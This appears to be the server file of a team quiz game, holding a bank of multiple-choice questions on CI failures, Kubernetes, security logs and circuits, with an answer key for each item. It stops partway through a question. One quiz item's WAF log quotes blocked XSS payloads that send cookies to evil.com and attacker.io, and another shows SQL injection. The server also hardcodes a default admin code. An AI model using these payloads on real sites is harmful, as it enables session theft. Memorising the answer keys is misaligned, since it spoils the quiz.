import express from 'express';
import http from 'http';
import { Server as SocketIOServer } from 'socket.io';
import { randomUUID } from 'crypto';
import { readFileSync, existsSync, writeFileSync, mkdirSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname  = dirname(__filename);
const dataDir    = join(__dirname, 'data');
const stateFile  = join(dataDir, 'game-state.json');

const app    = express();
const server = http.createServer(app);
const io     = new SocketIOServer(server, { cors: { origin: '*' }, pingTimeout: 60000, pingInterval: 25000 });
const PORT   = process.env.PORT || 3001;

// ─── Constants ────────────────────────────────────────────────────────────────
const ADMIN_CODE         = process.env.ADMIN_CODE || 'ADMIN2025';
const TOKENS_PER_ROUND   = 12;
const ROUND_DURATION_MIN = 40;
const LINES_TO_WIN       = 5;
const TOTAL_ROUNDS       = 3;
const FREEZE_MS          = 60000;
const PALETTE            = ['#d4af37','#22c55e','#38bdf8','#f472b6','#a78bfa','#f97316','#34d399','#fb7185','#60a5fa','#fbbf24'];
const POINTS_TABLE       = [100, 90, 80, 70, 60, 50, 40, 30, 20, 10];

const BOARD_PHRASES = [
  'CI Pipeline','Cloud Native','Zero Trust','Incident Triage','Kubernetes',
  'DevSecOps','Edge Computing','Threat Model','Git Branching','Observability',
  'IaC Review','Packet Sniffing','Log Analysis','Container Basics','SRE Mindset',
  'Auth Flow','Backup Strategy','Latency Hunt','Patch Planning','OSINT',
  'Network Topology','Service Mesh','Root Cause','Load Balancing','Safe Deploy',
];

// ─── Immersive Question Bank ──────────────────────────────────────────────────
// Token rule (per PDF): 1 token per attempt (Normal), 2 tokens per attempt (Boss).
// Tokens are deducted on EVERY attempt regardless of correct/wrong.
// This means: correct = cell marked, wrong = token lost, no cell.

const ALL_QUESTIONS = [

  // ════════════════════════════════════════════════
  //  ROUND 1 — DevOps Terminal Challenges
  // ════════════════════════════════════════════════

  { id:'r1q1', round:1, boss:false, category:'AI-DevOps',
    prompt:'The CI pipeline just failed. Examine the terminal log and identify the root cause.',
    meta:{ type:'terminal', logs:[
      '$ git push origin main',
      '$ Triggering pipeline: build-and-test',
      '[INFO] Installing dependencies...',
      '[INFO] npm install — 142 packages installed',
      '[INFO] Running lint checks... PASSED',
      '[INFO] Running unit tests...',
      '[ERROR] FAILED: src/auth/token.test.js',
      '[ERROR] Expected 200, got 401 — invalid JWT_SECRET',
      '[ERROR] Environment variable JWT_SECRET is undefined',
      '[FATAL] Pipeline failed at step: unit-tests',
    ]},
    options:['JWT_SECRET env variable missing in CI config','npm install failed','Lint check failed','Git push was rejected'],
    answer:0 },

  { id:'r1q2', round:1, boss:false, category:'AI-DevOps',
    prompt:'A Kubernetes deployment is crashlooping. Diagnose from the logs below.',
    meta:{ type:'terminal', logs:[
      '$ kubectl get pods -n production',
      'NAME                        READY   STATUS             RESTARTS',
      'api-server-7d9f8b-xk2p9    0/1     CrashLoopBackOff   14',
      '$ kubectl logs api-server-7d9f8b-xk2p9 --previous',
      '[INFO] Starting API server on port 8080',
      '[INFO] Connecting to database...',
      '[ERROR] ECONNREFUSED: Connection refused at 10.0.0.5:5432',
      '[ERROR] Database connection pool failed after 3 retries',
      '[FATAL] Cannot start server without database. Exiting.',
    ]},
    options:['Database is unreachable from the pod','Port 8080 is already in use','JWT secret is missing','kubectl version mismatch'],
    answer:0 },

  { id:'r1q3', round:1, boss:false, category:'AI-DevOps',
    prompt:'Docker build fails in CI but works locally. Read the log.',
    meta:{ type:'terminal', logs:[
      '$ docker build -t myapp:latest .',
      'Step 1/8 : FROM node:18-alpine',
      'Step 2/8 : WORKDIR /app',
      'Step 3/8 : COPY package*.json ./',
      'Step 4/8 : RUN npm install',
      '[ERROR] EACCES: permission denied, mkdir \'/app/node_modules\'',
      '[ERROR] npm ERR! code EACCES',
      '[INFO] Hint: CI runner uses non-root user; local Docker runs as root',
    ]},
    options:['CI runs as non-root user, directory permissions fail','npm version mismatch','Wrong Node.js base image','package.json not found'],
    answer:0 },

  { id:'r1q4', round:1, boss:false, category:'AI-DevOps',
    prompt:'Terraform plan shows unexpected resource destruction. What is the issue?',
    meta:{ type:'terminal', logs:[
      '$ terraform plan',
      '[INFO] Refreshing state...',
      '~ aws_instance.web_server (update in-place)',
      '  ~ instance_type: "t2.micro" → "t3.micro"',
      '-/+ aws_db_instance.main (destroy and recreate)',
      '  ~ engine_version: "13.4" → "14.1"',
      '  ! Forces replacement: engine_version change requires new resource',
      '[WARN] Plan: 1 to add, 1 to change, 1 to destroy.',
    ]},
    options:['Database engine version change forces resource replacement','Instance type cannot be changed','Terraform state is corrupted','AWS credentials expired'],
    answer:0 },

  { id:'r1q5', round:1, boss:false, category:'Scenario',
    prompt:'Prod is down. Users report 503 errors. Read the nginx access log.',
    meta:{ type:'terminal', logs:[
      '$ tail -100 /var/log/nginx/access.log | grep 5',
      '10.0.1.5 - "GET /api/health" 503 0ms',
      '10.0.1.5 - "GET /api/users" 503 0ms',
      '10.0.1.5 - "POST /api/login" 503 0ms',
      '$ curl http://localhost:8080/api/health',
      'curl: (7) Failed to connect to localhost port 8080: Connection refused',
      '$ ps aux | grep node',
      '  (no results)',
      '$ systemctl status app',
      '[FAILED] app.service — code=exited, status=1/FAILURE',
    ]},
    options:['The app process crashed and is not running','nginx config is wrong','Database is down','Port 8080 is blocked by firewall'],
    answer:0 },

  { id:'r1q6', round:1, boss:false, category:'Cyber Smart',
    prompt:'Review the auth log. Which attack pattern do you see?',
    meta:{ type:'terminal', logs:[
      '$ cat /var/log/auth.log | tail -20',
      'Failed password for root from 192.168.1.100 port 22',
      'Failed password for root from 192.168.1.100 port 22',
      'Failed password for admin from 192.168.1.100 port 22',
      'Failed password for ubuntu from 192.168.1.100 port 22',
      'Failed password for oracle from 192.168.1.100 port 22',
      'Failed password for postgres from 192.168.1.100 port 22',
      '-- 847 attempts in last 60 seconds from same IP --',
      'Failed password for pi from 192.168.1.100 port 22',
    ]},
    options:['SSH brute-force attack','SQL injection attempt','XSS attack in progress','DDoS from botnet'],
    answer:0 },

  { id:'r1q7', round:1, boss:false, category:'AI-DevOps',
    prompt:'Helm chart deployment fails. Identify the error from the output.',
    meta:{ type:'terminal', logs:[
      '$ helm upgrade --install my-app ./chart -n production',
      'Release "my-app" does not exist. Installing it now.',
      '[ERROR] INSTALLATION FAILED: rendered manifests contain',
      '        a resource that already exists.',
      'Error: rendered manifests contain a resource that already exists.',
      'Existing resource conflict: Ingress/my-app-ingress',
      '[INFO] Use --force flag or delete the existing resource first.',
      '[HINT] Run: kubectl delete ingress my-app-ingress -n production',
    ]},
    options:['An Ingress resource with that name already exists in the cluster','Helm chart syntax error','Invalid Docker image tag','Namespace does not exist'],
    answer:0 },

  { id:'r1q8', round:1, boss:false, category:'AI-DevOps',
    prompt:'Memory leak detected in production. Analyse the monitoring output.',
    meta:{ type:'terminal', logs:[
      '$ kubectl top pod api-server --namespace=prod',
      'NAME              CPU    MEMORY',
      'api-server-pod1   12m    148Mi   (T+0h)',
      'api-server-pod1   15m    312Mi   (T+2h)',
      'api-server-pod1   18m    576Mi   (T+4h)',
      'api-server-pod1   19m    891Mi   (T+6h)',
      'api-server-pod1   20m    1.2Gi   (T+8h)',
      '[ALERT] OOMKilled — pod restarted at T+8h22m',
      '$ kubectl describe pod api-server-pod1 | grep -A3 OOMKilled',
      'Last State: OOMKilled — exit code 137',
    ]},
    options:['Memory leak in the application — usage grows continuously until OOMKilled','Pod has too low CPU limit','Database running out of connections','Disk space exhausted'],
    answer:0 },

  { id:'r1q9', round:1, boss:false, category:'AI-DevOps',
    prompt:'Git workflow is broken. What is wrong with this repo\'s branch strategy?',
    meta:{ type:'terminal', logs:[
      '$ git log --oneline --graph main',
      '* a3f91c2 hotfix: patch XSS in login form (2 hours ago)',
      '* 88bc1e0 hotfix: fix null pointer in API (1 day ago)',
      '* 7d2f3a1 hotfix: emergency DB migration (3 days ago)',
      '* 5c9b2e0 hotfix: revert broken feature (5 days ago)',
      '* 3a8f1d9 hotfix: fix deployment crash (1 week ago)',
      '$ git branch',
      '  main',
      '  (no feature branches — all commits directly on main)',
    ]},
    options:['All changes pushed directly to main — no branch isolation or code review','Too many commits in the log','Missing git tags for releases','git log output is too long'],
    answer:0 },

  { id:'r1q10', round:1, boss:false, category:'Scenario',
    prompt:'Investigate the slow API. What does the trace reveal?',
    meta:{ type:'terminal', logs:[
      '$ curl -w "@timing.txt" -o /dev/null https://api.example.com/users',
      '   time_namelookup:  0.002s',
      '   time_connect:     0.008s',
      '   time_appconnect:  0.042s',
      '   time_pretransfer: 0.043s',
      '   time_starttransfer: 3.847s',
      '   time_total:       3.851s',
      '[INFO] DB query logs show: SELECT * FROM users — 3.79s',
      '[INFO] No index on users.created_at — full table scan (2.4M rows)',
    ]},
    options:['Missing database index causes full table scan on 2.4M rows','TLS handshake is too slow','DNS resolution failure','Network latency to server'],
    answer:0 },

  { id:'r1q11', round:1, boss:false, category:'Cyber Smart',
    prompt:'Security scan found a vulnerability. What type is it?',
    meta:{ type:'code', lines:[
      { type:'normal', code:'app.get("/user", async (req, res) => {' },
      { type:'normal', code:'  const userId = req.query.id;' },
      { type:'bug',    code:'  const user = await db.query(`SELECT * FROM users WHERE id = ${userId}`);' },
      { type:'normal', code:'  res.json(user);' },
      { type:'normal', code:'});' },
      { type:'comment',code:'' },
      { type:'comment',code:'// Request: GET /user?id=1 OR 1=1 --' },
      { type:'bug',    code:'// Executes: SELECT * FROM users WHERE id = 1 OR 1=1 --' },
      { type:'comment',code:'// Returns ALL users instead of one' },
    ]},
    prompt:'What vulnerability does this code contain?',
    options:['SQL Injection — unsanitized input concatenated into query','Cross-Site Scripting (XSS)','Broken authentication','Server-Side Request Forgery'],
    answer:0 },

  { id:'r1q12', round:1, boss:false, category:'AI-DevOps',
    prompt:'The load balancer health check fails. What is wrong?',
    meta:{ type:'terminal', logs:[
      '$ aws elbv2 describe-target-health --target-group-arn arn:...',
      'Target: 10.0.1.10:8080  State: unhealthy  Reason: Target.Timeout',
      'Target: 10.0.1.11:8080  State: unhealthy  Reason: Target.Timeout',
      'Target: 10.0.1.12:8080  State: healthy',
      '$ curl http://10.0.1.10:8080/health',
      '  (no response after 5s)',
      '$ ssh 10.0.1.10 "netstat -tlnp | grep 8080"',
      '  tcp 0.0.0.0:8080 LISTEN  (process running)',
      '$ ssh 10.0.1.10 "curl localhost:8080/health"',
      '  {"status":"ok"}  — responds locally but not externally',
    ]},
    options:['Security group / firewall blocks inbound port 8080 from load balancer','Application crashed on those instances','Wrong target group port configured','SSL certificate expired'],
    answer:0 },

  { id:'r1q13', round:1, boss:false, category:'Slice of Life',
    prompt:'Your teammate pushed broken code to main 10 minutes before a client demo. What do you do?',
    meta:{ type:'terminal', logs:[
      '$ git log --oneline -5',
      'f9a2c31 (HEAD, main) Add new dashboard feature',
      '4b8e1f2 Fix user profile bug',
      '$ npm test',
      '[ERROR] FAILED: dashboard.test.js — TypeError: undefined is not a function',
      '[ERROR] 7 tests failed, 0 passed',
      '$ git log --stat f9a2c31',
      '  src/dashboard/index.js | 47 ++++++++--',
      '  (no tests added for new code)',
    ]},
    options:['Immediately git revert the commit and notify the team','Delete the test file so CI passes','Push more code to fix it quickly without testing','Tell the client the demo is cancelled'],
    answer:0 },

  { id:'r1q14', round:1, boss:false, category:'AI-DevOps',
    prompt:'Container image vulnerability scan results. What is the priority action?',
    meta:{ type:'terminal', logs:[
      '$ trivy image myapp:latest',
      'myapp:latest (alpine 3.14.0)',
      '===================================',
      'CRITICAL  CVE-2021-44228  log4j-core  2.14.1  → Fix: 2.17.1',
      'CRITICAL  CVE-2022-0847   linux-libc  5.8.0   → Fix: 5.10.102',
      'HIGH      CVE-2021-3711   openssl     1.1.1k  → Fix: 1.1.1l',
      'MEDIUM    CVE-2022-1271   gzip        1.10    → Fix: 1.12',
      '[SUMMARY] 2 CRITICAL, 1 HIGH, 1 MEDIUM vulnerabilities found',
    ]},
    options:['Patch log4j-core to 2.17.1 — CVE-2021-44228 is a critical RCE (Log4Shell)','Patch gzip first as it is the easiest','Ignore all — these are base image issues','Rebuild without trivy installed'],
    answer:0 },

  { id:'r1q15', round:1, boss:false, category:'AI-DevOps',
    prompt:'Pipeline artifact size is growing. Find the cause.',
    meta:{ type:'terminal', logs:[
      '$ du -sh dist/*',
      '4.2M  dist/vendor.js',
      '18.7M dist/app.js',
      '1.1M  dist/styles.css',
      '$ source-map-explorer dist/app.js',
      '[INFO] node_modules/moment  — 67.8% of bundle (12.7MB)',
      '[INFO] node_modules/lodash  — 8.4% of bundle (1.6MB)',
      '[INFO] src/                 — 14.2% of bundle (2.7MB)',
      '[WARN] moment imported but only .format() and .diff() used',
      '[WARN] lodash imported as "import _ from lodash" — no tree-shaking',
    ]},
    options:['moment.js and lodash are not tree-shaken — entire libraries bundled','CSS file is too large','dist/vendor.js needs splitting','Source maps included in production build'],
    answer:0 },

  { id:'r1q16', round:1, boss:false, category:'Scenario',
    prompt:'Staging works, production fails with the same code. Read the diff.',
    meta:{ type:'terminal', logs:[
      '$ diff staging.env production.env',
      '< NODE_ENV=staging',
      '> NODE_ENV=production',
      '< CACHE_TTL=0',
      '> CACHE_TTL=3600',
      '< DB_POOL_SIZE=5',
      '> DB_POOL_SIZE=50',
      '$ grep -r "process.env.CACHE_TTL" src/',
      '  src/cache.js: ttl = Number(process.env.CACHE_TTL)',
      '  src/cache.js: if (ttl) { return cachedData; }  // returns if ttl > 0',
      '[BUG] Production caches stale data for 3600s — staging TTL=0 skips cache',
    ]},
    options:['Production cache TTL=3600 serves stale data — staging bypasses cache with TTL=0','DB pool size difference causes connection errors','NODE_ENV variable causes different code paths','Staging and production use different databases'],
    answer:0 },

  { id:'r1q17', round:1, boss:false, category:'Cyber Smart',
    prompt:'Find the vulnerability in this authentication code.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'async function login(username, password) {' },
      { type:'normal',  code:'  const user = await User.findOne({ username });' },
      { type:'normal',  code:'  if (!user) return { error: "User not found" };' },
      { type:'bug',     code:'  if (user.password === password) {  // plain text comparison' },
      { type:'normal',  code:'    return generateToken(user);' },
      { type:'normal',  code:'  }' },
      { type:'normal',  code:'  return { error: "Wrong password" };' },
      { type:'normal',  code:'}' },
      { type:'comment', code:'// DB contains: { username:"admin", password:"hunter2" }' },
    ]},
    prompt:'What is wrong with this login function?',
    options:['Passwords stored and compared as plain text — should use bcrypt hash','Missing rate limiting on login endpoint','JWT token not validated properly','Username lookup is vulnerable to injection'],
    answer:0 },

  { id:'r1q18', round:1, boss:false, category:'AI-DevOps',
    prompt:'The rolling deployment is causing downtime. Find the issue.',
    meta:{ type:'terminal', logs:[
      '$ kubectl rollout status deployment/api -n prod',
      'Waiting for rollout to finish: 1 out of 3 new replicas updated...',
      '$ kubectl describe deployment api -n prod | grep -A4 "Strategy"',
      'Strategy: RollingUpdate',
      '  maxSurge: 0',
      '  maxUnavailable: 1',
      '$ kubectl get pods -n prod',
      'api-v1-pod1   Running   (being terminated)',
      'api-v2-pod1   Running   (new version)',
      '[WARN] With maxSurge=0 and maxUnavailable=1, capacity drops to 66% during rollout',
    ]},
    options:['maxSurge=0 means no extra pods during rollout, reducing available capacity','Wrong Docker image tag used','Health check endpoint is missing','Deployment namespace is wrong'],
    answer:0 },

  { id:'r1q19', round:1, boss:false, category:'AI-DevOps',
    prompt:'Identify the misconfiguration in this Dockerfile.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'FROM node:18' },
      { type:'normal',  code:'WORKDIR /app' },
      { type:'bug',     code:'COPY . .'  },
      { type:'normal',  code:'RUN npm install' },
      { type:'normal',  code:'EXPOSE 3000' },
      { type:'normal',  code:'CMD ["node", "server.js"]' },
      { type:'comment', code:'' },
      { type:'comment', code:'# Issue: COPY . . runs before npm install' },
      { type:'bug',     code:'# node_modules copied in, then overwritten — cache invalidated every build' },
    ]},
    prompt:'What is the performance issue with this Dockerfile?',
    options:['COPY . . before npm install means every code change invalidates the npm install cache layer','Wrong base image used','EXPOSE is missing','CMD should use npm start'],
    answer:0 },

  { id:'r1q20', round:1, boss:false, category:'Scenario',
    prompt:'Microservice B is timing out. Trace the distributed call chain.',
    meta:{ type:'terminal', logs:[
      '$ jaeger trace ID: abc123',
      'Gateway          → Service A    4ms   ✓',
      'Service A        → Service B    2ms   ✓',
      'Service B        → DB Query     3ms   ✓',
      'Service B        → Service C    3012ms ✗ TIMEOUT',
      'Service C        → External API 2998ms ✗ TIMEOUT',
      'External API     → (no response)',
      '[ALERT] External payment API SLA breach — p99 latency: 3200ms',
      '[INFO] No circuit breaker configured for External API calls',
    ]},
    options:['No circuit breaker on External API — timeout cascades through the call chain','Service B has a memory leak','Database query is slow','Gateway is misconfigured'],
    answer:0 },

  { id:'r1q21', round:1, boss:false, category:'Cyber Smart',
    prompt:'Analyse the network scan output for open attack surfaces.',
    meta:{ type:'terminal', logs:[
      '$ nmap -sV 10.0.1.50',
      'PORT      STATE  SERVICE       VERSION',
      '22/tcp    open   ssh           OpenSSH 7.2p2',
      '80/tcp    open   http          nginx 1.10.0',
      '443/tcp   open   https         nginx 1.10.0',
      '3306/tcp  open   mysql         MySQL 5.7.34',
      '27017/tcp open   mongodb       MongoDB 3.6',
      '6379/tcp  open   redis         Redis 3.2.11',
      '[WARN] MySQL, MongoDB, Redis exposed on public interface 0.0.0.0',
      '[WARN] Redis 3.2.11 has no authentication configured',
    ]},
    options:['Database ports (MySQL, MongoDB, Redis) exposed publicly with no auth — critical attack surface','SSH port 22 should be closed','nginx version is outdated','HTTPS is not configured correctly'],
    answer:0 },

  { id:'r1q22', round:1, boss:false, category:'AI-DevOps',
    prompt:'The canary deployment shows elevated errors. What does monitoring reveal?',
    meta:{ type:'terminal', logs:[
      '$ kubectl get deployments -n prod',
      'app-stable   95%   (19/20 pods)    error_rate: 0.1%',
      'app-canary    5%   (1/20 pods)     error_rate: 8.4%',
      '$ kubectl logs app-canary-pod --tail=20',
      '[ERROR] TypeError: Cannot read properties of undefined (reading "userId")',
      '[ERROR] at src/middleware/auth.js:42',
      '[INFO]  This version expects req.user.userId, not req.user.id',
      '[INFO]  Previous version used req.user.id',
      '[BUG]   Breaking API contract change in canary build',
    ]},
    options:['Canary has a breaking change — req.user.userId used instead of req.user.id','Canary pod has insufficient CPU','Canary routes too much traffic','Database schema mismatch'],
    answer:0 },

  { id:'r1q23', round:1, boss:false, category:'Slice of Life',
    prompt:'Your team has 45 minutes left and 8 unsolved nodes. Best strategy?',
    meta:{ type:'terminal', logs:[
      '$ ./grid-status --team "Team Alpha"',
      'Lines completed:  3/5',
      'Tokens remaining: 6',
      'Nodes remaining:  8',
      'Time left:        45 minutes',
      '',
      'Node analysis:',
      '  Easy   (1 token each): 3 nodes — estimated 5-8min each',
      '  Medium (1 token each): 3 nodes — estimated 10-12min each',
      '  Hard   (1 token each): 1 node  — estimated 20min',
      '  Boss   (2 tokens):     1 node  — estimated 25min',
    ]},
    options:['Solve 3 easy nodes first to complete the 2 needed lines, use remaining tokens on medium nodes','Attempt the Boss node first for maximum points','Split team and work all nodes simultaneously','Save tokens and wait for a Global Hack event'],
    answer:0 },

  { id:'r1q24', round:1, boss:false, category:'AI-DevOps',
    prompt:'Identify the issue with this GitHub Actions workflow.',
    meta:{ type:'code', lines:[
      { type:'normal',  code:'name: Deploy to Production' },
      { type:'normal',  code:'on:' },
      { type:'bug',     code:'  push:' },
      { type:'bug',     code:'    branches: ["*"]  # ALL branches trigger prod deploy' },
      { type:'normal',  code:'jobs:' },
      { type:'normal',  code:'  deploy:' },
      { type:'normal',  code:'    runs-on: ubuntu-latest' },
      { type:'normal',  code:'    steps:' },
      { type:'normal',  code:'      - uses: actions/checkout@v3' },
      { type:'bug',     code:'      - run: ./deploy.sh --env production  # no approval step' },
    ]},
    prompt:'What is the critical mistake in this workflow?',
    options:['Any push to any branch triggers a production deployment with no approval gate','Actions checkout version is outdated','Ubuntu runner is wrong choice','deploy.sh script is missing'],
    answer:0 },

  { id:'r1q25', round:1, boss:false, category:'Scenario',
    prompt:'Read the incident timeline and identify the change that caused the outage.',
    meta:{ type:'terminal', logs:[
      '14:00  Release v2.4.1 deployed to production',
      '14:02  Monitoring shows error rate: 0.1% (baseline)',
      '14:15  Error rate rises to 2.3%',
      '14:28  Error rate: 18.7% — PagerDuty alert fires',
      '14:30  Incident declared — on-call engineer paged',
      '14:35  Git blame shows v2.4.1 changed DB connection pool: 10 → 100',
      '14:36  Postgres shows 98/100 max_connections used — pool exhausted',
      '14:40  Hotfix deployed: pool size reverted to 10',
      '14:42  Error rate drops to 0.2% — incident resolved',
    ]},
    options:['DB connection pool increased to 100 exceeded Postgres max_connections limit','Release was deployed during peak hours','Monitoring alert threshold was set too high','on-call response was too slow'],
    answer:0 },

  { id:'r1q26', round:1, boss:false, category:'AI-DevOps',
    prompt:'The service mesh shows unusual traffic. What attack does this resemble?',
    meta:{ type:'terminal', logs:[
      '$ istio proxy-status',
      'SERVICE          RPS    ERROR%   P99_LATENCY',
      'api-gateway      12400  0.1%     45ms',
      'user-service     12398  68.3%    4200ms',
      'order-service    12401  0.2%     42ms',
      'payment-service  12399  0.3%     39ms',
      '',
      '$ kubectl top pod -n prod | grep user',
      'user-service-pod  980m/1000m CPU  (98% CPU usage)',
      '[ALERT] user-service responding slowly — high CPU, elevated errors',
    ]},
    options:['user-service is CPU-starved — likely a resource exhaustion bug or targeted load','Network partition between services','DNS resolution failure in service mesh','TLS certificate expired on user-service'],
    answer:0 },

  { id:'r1q27', round:1, boss:false, category:'Cyber Smart',
    prompt:'Examine this HTTP request captured in a WAF log. What is the attacker attempting?',
    meta:{ type:'terminal', logs:[
      '$ cat waf.log | grep BLOCKED | tail -5',
      'BLOCKED: GET /search?q=<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
      'BLOCKED: GET /profile?name=<img src=x onerror="eval(atob(\'...\'))">',
      'BLOCKED: POST /comment body=<svg onload="document.location=\'https://attacker.io?q=\'+document.cookie">',
      'BLOCKED: GET /api?callback=<script>alert(1)</script>',
      '[INFO] All requests from IP 45.33.32.156 — same attacker pattern',
    ]},
    options:['Cross-Site Scripting (XSS) — injecting scripts to steal cookies','SQL injection targeting the database','Path traversal to read server files','CSRF token bypass attempt'],
    answer:0 },

  { id:'r1q28', round:1, boss:false, category:'AI-DevOps',
    prompt:'Find the bottleneck in this microservice performance trace.',
    meta:{ type:'terminal', logs:[
      '$ otel trace --service checkout-api --trace-id d4f9a2',
      'checkout-api       total:  2847ms',
      '├─ validate-cart        8ms  ✓',
      '├─ get-user-address    12ms  ✓',
      '├─ calculate-tax       15ms  ✓',
      '├─ inventory-check   2780ms  ✗ SLOW',
      '│  ├─ cache lookup      2ms  MISS',
      '│  └─ db query       2778ms  (SELECT * FROM inventory — no index on sku_id)',
      '└─ create-order         32ms  ✓',
    ]},
    options:['inventory-check DB query missing index on sku_id — causes full table scan','validate-cart should be async','Tax calculation is inefficient','User address service is too slow'],
    answer:0 },

  { id:'r1q29', round:1, boss:false, category:'Scenario',
    prompt:'The Helm chart releases fail every time. What pattern do you see?',
    meta:{ type:'terminal', logs:[
      '$ helm history my-app -n prod',
      'REVISION  STATUS      DESCRIPTION',
      '1         superseded  Install complete',
      '2         superseded  Upgrade complete',
      '3         failed      Upgrade "my-app" failed: timed out waiting for condition',
      '4         failed      Upgrade "my-app" failed: timed out waiting for condition',
      '5         failed      Upgrade "my-app" failed: timed out waiting for condition',
      '$ kubectl describe pod -n prod | grep -A3 "Liveness"',
      'Liveness: http-get /healthz delay=5s period=5s',
      '$ kubectl logs my-app-pod -n prod | tail -3',
      '[INFO] Server starting... warming up cache (takes ~45 seconds)',
    ]},
    options:['Liveness probe fires before app finishes startup (45s) — increase initialDelaySeconds','Wrong image tag in Helm values','Insufficient memory for the pod','Helm chart version incompatible with cluster'],
    answer:0 },

  { id:'r1q30', round:1, boss:true, category:'AI-DevOps',
    prompt:'[BOSS] This is a multi-stage incident. Read the complete post-mortem log and identify the TRUE root cause.',
    meta:{ type:'terminal', logs:[
      '=== POST-MORTEM: 4-hour outage on 2024-03-15 ===',
      '09:00  Auto-scaling triggered — traffic spike from marketing campaign',
      '09:02  New pods fail to start: ImagePullBackOff',
      '09:03  Existing pods overloaded — response time 8000ms',
      '09:05  Circuit breakers open — downstream services return 503',
      '09:10  ECR pull rate limit hit: 429 Too Many Requests',
      '09:11  Root cause found: ECR unauthenticated pull limit = 1 pull/sec',
      '09:12  All 50 new pods pulling same image simultaneously = rate limited',
      '09:45  Fix: pre-pull image on nodes via DaemonSet, ECR authenticated',
      '10:00  Outage resolved — 4h total impact',
      '=== TIMELINE ANALYSIS ===',
      'Q: Why did scale-out fail?',
      'A: ECR rate limit hit when 50 pods pulled simultaneously without auth',
    ]},
    options:[
      'ECR unauthenticated pull rate limit hit during simultaneous scale-out of 50 pods',
      'Auto-scaling configuration was wrong',
      'Marketing campaign was not communicated to engineering',
      'Circuit breakers were misconfigured',
    ],
    answer:0 },

  // ════════════════════════════════════════════════
  //  ROUND 2 — CPS Circuit & Protocol Challenges
  // ════════════════════════════════════════════════

  { id:'r2q1', round:2, boss:false, category:'CPS',
    prompt:'The circuit below fails to light the LED. Find the fault in the schematic.',
    meta:{ type:'circuit', diagram:[
      '+5V ──────────────────────────────┐',
      '                                  │',
      '                               R1 (220Ω)',
      '                                  │',
      '                                  ├── LED Anode',
      '                                  │',
      '              Arduino D13 ────────┤',
      '                                  │',
      '              GPIO OUTPUT ────────┘',
      '                                  │',
      '                               LED Cathode',
      '                                  │',
      '                                 ??  ← Missing connection',
      '                                  │',
      '                                 (open)',
    ], faultLine: 12 },
    prompt:'What fault prevents the LED from turning on?',
    options:['LED cathode is not connected to GND — circuit is open','Resistor value too high','Wrong GPIO pin used','LED is reversed (anode/cathode swapped)'],
    answer:0 },

  { id:'r2q2', round:2, boss:false, category:'CPS',
    prompt:'Identify the protocol from the serial monitor capture.',
    meta:{ type:'packet', packets:[
      { time:'0.000', addr:'48', data:'START | W', clk:'↑', flag:'ACK', anomaly:false },
      { time:'0.001', addr:'48', data:'REG: 0x00', clk:'↑', flag:'ACK', anomaly:false },
      { time:'0.002', addr:'48', data:'START | R', clk:'↑', flag:'ACK', anomaly:false },
      { time:'0.003', addr:'48', data:'0x18 0x00', clk:'↑', flag:'ACK', anomaly:false },
      { time:'0.004', addr:'FF', data:'STOP',       clk:'↓', flag:'END', anomaly:false },
      { time:'0.005', addr:'48', data:'START | W', clk:'↑', flag:'ACK', anomaly:false },
      { time:'0.006', addr:'48', data:'REG: 0x01', clk:'↑', flag:'NACK', anomaly:true },
    ]},
    prompt:'Which protocol does this capture show, and what does the NACK indicate?',
    options:['I2C — NACK means the slave device did not acknowledge the register address','SPI — chip select error','UART — framing error detected','CAN bus — arbitration loss'],
    answer:0 },

  { id:'r2q3', round:2, boss:false, category:'CPS',
    prompt:'Logic gate circuit simulation. Determine the output.',
    meta:{ type:'logic', expression:'NOT(AND(A, B)) OR (XOR(C, D))', inputs:{ A:true, B:true, C:1, D:0 }, expected:'?' },
    prompt:'Given the expression NOT(AND(A,B)) OR XOR(C,D) with A=1,B=1,C=1,D=0, what is the output?',
    options:['1  (NOT(1) OR 1 = 0 OR 1 = 1)','0  (NOT(1) OR 1 = 0 OR 1 = 0)','Undefined — short circuit','1  (AND(1,1) = 1 directly)'],
    answer:0 },

  { id:'r2q4', round:2, boss:false, category:'CPS',
    prompt:'The ultrasonic sensor returns garbage data. Analyse the oscilloscope trace.',
    meta:{ type:'circuit', diagram:[
      'HC-SR04 Sensor Timing Analysis',
      '================================',
      'TRIGGER pulse:  10μs ✓  (correct)',
      '',
      'Expected ECHO response:',
      '  High duration = (distance × 2) / 343m/s',
      '  For 20cm: echo should be ~1.17ms high',
      '',
      'Actual ECHO signal:',
      '  T+0ms:    LOW  (waiting)',
      '  T+0.1ms:  HIGH (echo starts)',
      '  T+0.1ms:  LOW  (echo ends — 0μs duration!)',
      '  T+1.2ms:  (nothing — missed real echo)',
      '  Reading returned: 0cm',
      '',
      'Diagnosis: Echo pin reads interrupt latency = 0μs',
      'Likely cause: interrupt handler too slow / echo missed',
    ], faultLine: 11 },
    prompt:'Why does the ultrasonic sensor return 0cm?',
    options:['Echo pulse missed — microcontroller interrupt latency too high, echo completes before handler registers it','Trigger pulse is too short','Sensor is broken','Wrong baud rate configured'],
    answer:0 },

  { id:'r2q5', round:2, boss:false, category:'CPS',
    prompt:'SPI communication is corrupted. Find the configuration mismatch.',
    meta:{ type:'packet', packets:[
      { time:'0.000', addr:'CS', data:'LOW (select)', clk:'—',  flag:'START', anomaly:false },
      { time:'0.001', addr:'TX', data:'0xFF (cmd)',   clk:'↑',  flag:'OK',    anomaly:false },
      { time:'0.002', addr:'RX', data:'0x00 (idle)',  clk:'↑',  flag:'OK',    anomaly:false },
      { time:'0.003', addr:'TX', data:'0x01 (addr)',  clk:'↑',  flag:'OK',    anomaly:false },
      { time:'0.004', addr:'RX', data:'0x6B (data)',  clk:'↑',  flag:'OK',    anomaly:false },
      { time:'0.005', addr:'TX', data:'0x00 (read)',  clk:'↓',  flag:'ERR',   anomaly:true  },
      { time:'0.006', addr:'RX', data:'0xFF (garb)',  clk:'↓',  flag:'ERR',   anomaly:true  },
      { time:'0.007', addr:'CS', data:'HIGH',         clk:'—',  flag:'END',   anomaly:false },
    ]},
    prompt:'At T+0.005 the data becomes corrupted. What is the likely cause?',
    options:['SPI clock phase (CPHA) mismatch — master samples on wrong clock edge','Wrong chip select polarity','SPI speed too high','MISO and MOSI wires swapped'],
    answer:0 },

  { id:'r2q6', round:2, boss:false, category:'CPS',
    prompt:'Motor control circuit has a fault. Identify the missing protection component.',
